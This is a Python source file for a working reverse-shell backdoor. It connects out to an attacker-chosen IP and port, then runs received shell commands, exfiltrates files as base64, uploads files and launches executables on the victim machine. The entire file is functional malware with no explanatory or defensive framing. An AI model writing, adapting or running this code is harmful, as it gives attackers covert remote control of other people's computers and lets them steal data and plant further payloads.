import subprocess, sys, socket, json, argparse, os, base64, traceback, time, threading


class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')     
        parser.set_defaults(port = 1337)
        options = parser.parse_args()
        self.ip = options.ip
        self.port = options.port


class Backdoor:
    
    
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.connection.connect((str(ip),int(port)))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def cd(self,path):
        try:
            ###print('path:',path)
            fullPath = path[1:] # path will be everything following cd command
            ###print('fullPath:',fullPath)
            fullPathJoin = ' '.join(fullPath)
            ###print('fullPathJoin:',fullPathJoin)
            os.chdir(str(fullPathJoin))
            ###print(os.curdir)
            return f"Changing directory\n>>\"{str(fullPathJoin)}\"\nCurrent Directory:\n{str(os.path.abspath(os.curdir))}"
        except PermissionError:
            self.sendStream('PermissionError, change directory command not accepted by target')
        except FileNotFoundError:
            self.sendStream('FileNotFoundError, change directory command not accepted by target')
        except OSError:
            self.sendStream('OSError, change directory command not accepted by target')
            
    
    def executeCmd(self,cmd):
        try:
            cmd = subprocess.check_output(cmd,shell=True)
            print(cmd)
           
            return cmd
        except subprocess.CalledProcessError as e:
            return str(e)
    
    
    def sendStream(self,data):
        #print('start of send stream')
        #print(f'data passed into function: {data}')
        #print(f'sendStream data type: {type(data)}')
        
        if isinstance(data,str): #for regular output 
            jsData = json.dumps(data)
            ####print(jsData)
            self.connection.send(str(jsData).encode('utf-8'))
        
        elif isinstance(data,dict): #using this for download function
            ###print(type(data))
            ###print(type(data['data']))
            ###print(data['data'])
            
            if 'data' in data.keys():
                
                if isinstance(data['data'],bytes):
                    data['data'] = data['data'].decode()
                ###print(type(data))
                ###print(type(data['data']))
                ###print(data['data'])
                #data = data['data'] #value of data
                #print(f'sendStream dict data: {data}')
                #print(type(data['data'])) #should be string
                #print(type(data)) #should be dict
                
                jsData = json.dumps(data)
                #print(jsData)
                self.connection.send(str(jsData).encode('utf-8'))
            
            else:
                if isinstance(data['fault'],bytes):
                    data['fault'] = data['fault'].decode()
                jsData = json.dumps(data)
                self.connection.send(str(jsData).encode('utf-8'))
        
        else:  # remainder of data types for now list                                          
            print(f'data type: {type(data)}')
            threadPid = str(data[-1])
            print(f'string threadPid: {threadPid}')
            jsData = json.dumps(threadPid)
            self.connection.send(str(jsData).encode('utf-8'))


    def runExecutable(self,exe):
        os.system(exe)
       

    def recvStream(self):
        time.sleep(1)
        jsData = ''
        while True:
            try:
                recvData = self.connection.recv(1024)
                recvData = recvData.decode() 
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                continue

    
    def read_file(self,file):
        fnfError = {'fault':(base64.b64encode(b'FileNotFoundError'))}
        indError = {'fault':(base64.b64encode(b'IndexError'))}
        data = {}
        ###print('start of read_file basic')
        
        try:
            with open(file,'rb') as read_file:
                value = read_file.read()
            ###print(value)
            value = base64.b64encode(value)
            ###print(value,':',type(value))
            data['data'] = value
            ###print(data)
            return data #dictionary for download 
        
        except FileNotFoundError:
            return fnfError
        
        except IndexError:
            return indError


    def write_file(self,file,content): #still going to use dictionary for sendandreceive
        #print('Starting write_file')
        #print(type(self.cmdIn[2]))
        if isinstance(self.cmdIn[2],dict): #dict should be {file:content}   
            #print(f'Content to write: {content}')         
            with open(file,'wb') as write_file:
                write_file.write(base64.b64decode(content))
            
            #print(os.listdir(os.curdir))
            if (file in os.listdir()): #bool
                #print('upload successful')
                returnVal = f'Successfully uploaded {file}'
                return {'data':returnVal} #dict to keep listener happy
            

    def run(self):
        while True:
            print('run1')
            self.cmdIn = self.recvStream()
            print(self.cmdIn) #list of the whole command output
    
            if self.cmdIn[0] == 'bye':
                ###print('bye')
                self.connection.close()
                exit()
            
            elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:  #meaning cmdIn = ['cd','c:\\'] is len() = 2
                ###print('trying CD') 
                cmdOut = self.cd(self.cmdIn) 
                self.sendStream(cmdOut)
            
            elif self.cmdIn[0] == 'download': #download function starting using read_file currently
                
                ##print('Trying download')
                ##print(f'file cmd received: {self.cmdIn[1]}')
                cmdOut = self.read_file(self.cmdIn[1]) # cmdIn[1] is the file test.txt, text.png, etc, WILL SEND A DICTIONARY
                ##print(f'readFile method complete')
                ##print(type(cmdOut))
                ##print(f'sending data: {type(cmdOut)}')
                self.sendStream(cmdOut)
            
            elif self.cmdIn[0] == 'upload':
                writeDict = self.cmdIn[2]
                #print(writeDict)
                file = list(writeDict.keys())[0]
                content = list(writeDict.values())[0]
                #print(f'File: {file} ; Content: {content}')
                ##print(f'Upload cmd received: {self.cmdIn[1]}')
                cmdOut = self.write_file(file, content) #[1] is file name we are writing to memory, [2] is the content of the file
                self.sendStream(cmdOut)

            elif self.cmdIn[0] == 'execute':
                print(f'Trying execute: {self.cmdIn[1]}') #should be the exe name
                thread = threading.Thread(target=self.runExecutable,args=(self.cmdIn[1],))
                thread.start()
                self.sendStream(threading.enumerate())
                            
            else:   
                print('Try execute cmd')
                ###print('run3_PRE_TRY')
                cmdOut = self.executeCmd(self.cmdIn)  
                ###print(f'{cmdOut[1:20]},{type(cmdOut)}')
                ###print('run4_POST_TRY')
                if isinstance(cmdOut,bytes):
                    cmdOut = cmdOut.decode('utf-8')
                ####print(cmdOut)
                ###print(type(cmdOut))
                self.sendStream(cmdOut)
###############################################################################################RUN#########################################################################################################################                   

try:
    args = Args()
    backdoor = Backdoor(args.ip,args.port)
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()
    